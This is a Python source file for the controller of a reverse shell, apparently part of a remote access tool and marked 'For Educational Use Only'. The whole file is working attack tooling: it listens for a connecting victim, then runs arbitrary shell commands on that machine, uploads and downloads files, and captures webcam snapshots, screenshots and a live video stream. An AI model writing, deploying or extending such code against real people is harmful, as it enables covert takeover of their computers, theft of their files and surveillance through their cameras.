import socket
import struct
import os
import threading
import time
import cv2
import numpy as np
import sys

HOST = '0.0.0.0'
PORT = 65432

def print_banner():
    print("\033[96m" + r"""
    ██████╗ ███████╗██████╗ ██╗   ██╗███████╗███████╗██╗  ██╗██╗     ██╗     
    ██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝██╔════╝██║ ██╔╝██║     ██║     
    ██████╔╝█████╗  ██████╔╝██║   ██║█████╗  █████╗  █████╔╝ ██║     ██║     
    ██╔═══╝ ██╔══╝  ██╔═══╝ ██║   ██║██╔══╝  ██╔══╝  ██╔═██╗ ██║     ██║     
    ██║     ███████╗██║     ╚██████╔╝███████╗███████╗██║  ██╗███████╗███████╗
    ╚═╝     ╚══════╝╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝
    Reverse Shell Controller - For Educational Use Only
    \033[0m""")

def send_data(sock, data: bytes):
    length = struct.pack('>I', len(data))
    sock.sendall(length + data)

def receive_data(sock):
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    length = struct.unpack('>I', raw_len)[0]
    return recvall(sock, length)

def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def save_image(data_bytes, prefix="image"):
    timestamp = int(time.time())
    filename = f"{prefix}_{timestamp}.jpg"
    with open(filename, 'wb') as f:
        f.write(data_bytes)
    print(f"[+] {prefix.capitalize()} saved as {filename}")

class ClientConnection:
    def __init__(self, host=HOST, port=PORT):
        self.host = host
        self.port = port
        self.sock = None
        self.lock = threading.Lock()

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((self.host, self.port))
        self.sock.listen(1)
        print_banner()
        print(f"[+] Listening on {self.host}:{self.port}...")
        self.client_sock, self.client_addr = self.sock.accept()
        print(f"[+] Connected by {self.client_addr}")

    def close(self):
        if self.client_sock:
            self.client_sock.close()
        if self.sock:
            self.sock.close()

    def send_command(self, command: str):
        with self.lock:
            send_data(self.client_sock, command.encode('utf-8'))

    def receive_response(self):
        with self.lock:
            return receive_data(self.client_sock)

    def upload_file(self, filename):
        if not os.path.isfile(filename):
            print(f"[-] File not found: {filename}")
            return
        with open(filename, 'rb') as f:
            file_bytes = f.read()
        print(f"[+] Sending file '{filename}' ({len(file_bytes)} bytes) to client...")
        with self.lock:
            send_data(self.client_sock, file_bytes)

    def download_file(self, filename):
        print(f"[+] Waiting to receive file '{filename}' from client...")
        file_bytes = self.receive_response()
        if file_bytes is None:
            print("[-] Failed to receive file or connection closed.")
            return
        save_name = f"received_{os.path.basename(filename)}"
        with open(save_name, 'wb') as f:
            f.write(file_bytes)
        print(f"[+] File received and saved as '{save_name}'")

    def receive_and_save_image(self, prefix):
        print(f"[+] Waiting for {prefix} from client...")
        data = self.receive_response()
        if data:
            save_image(data, prefix=prefix)
        else:
            print(f"[-] Failed to receive {prefix} or connection closed.")

    def handle_stream(self):
        print("[*] Starting video stream. Press 'q' in the window or type 'stopstream' to stop.")

        def stream_receiver():
            try:
                while True:
                    frame_bytes = receive_data(self.client_sock)
                    if frame_bytes is None:
                        print("[!] Stream ended or connection lost.")
                        break
                    np_arr = np.frombuffer(frame_bytes, np.uint8)
                    frame = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)
                    if frame is None:
                        print("[!] Received invalid frame.")
                        break
                    cv2.imshow("Live Stream", frame)
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        print("[*] Stream stopped by user pressing 'q'.")
                        self.send_command("stopstream")
                        break
            except Exception as e:
                print(f"[!] Stream error: {e}")
            finally:
                cv2.destroyAllWindows()

        receiver_thread = threading.Thread(target=stream_receiver, daemon=True)
        receiver_thread.start()

        while receiver_thread.is_alive():
            user_cmd = input()
            if user_cmd.strip().lower() == "stopstream":
                self.send_command("stopstream")
                break

    def show_help(self):
        print("\nAvailable commands:")
        print("  help                  Show this help message")
        print("  upload <file>         Upload file to client")
        print("  download <file>       Download file from client")
        print("  snapshot              Take and save a webcam snapshot")
        print("  screenshot            Take and save a screenshot")
        print("  stream                Start live video stream")
        print("  stopstream            Stop the video stream")
        print("  exit                  Close the session")
        print("  <command>             Any other shell command to execute on client\n")

    def interactive_shell(self):
        try:
            while True:
                command = input("Shell > ").strip()
                if not command:
                    continue

                if command.lower() == 'help':
                    self.show_help()
                    continue

                self.send_command(command)

                if command.lower() == 'exit':
                    print("[*] Exiting session.")
                    break

                elif command.lower().startswith('upload '):
                    filename = command.split(maxsplit=1)[1]
                    self.upload_file(filename)
                    response = self.receive_response()
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                    else:
                        print("[!] No confirmation received.")

                elif command.lower().startswith('download '):
                    filename = command.split(maxsplit=1)[1]
                    self.download_file(filename)

                elif command.lower() == 'snapshot':
                    self.receive_and_save_image('snapshot')

                elif command.lower() == 'screenshot':
                    self.receive_and_save_image('screenshot')

                elif command.lower() == 'stream':
                    self.handle_stream()

                else:
                    response = self.receive_response()
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                    else:
                        print("[!] No response received or connection closed.")
        finally:
            self.close()

def main():
    server = ClientConnection()
    server.connect()
    server.interactive_shell()

if __name__ == "__main__":
    main()
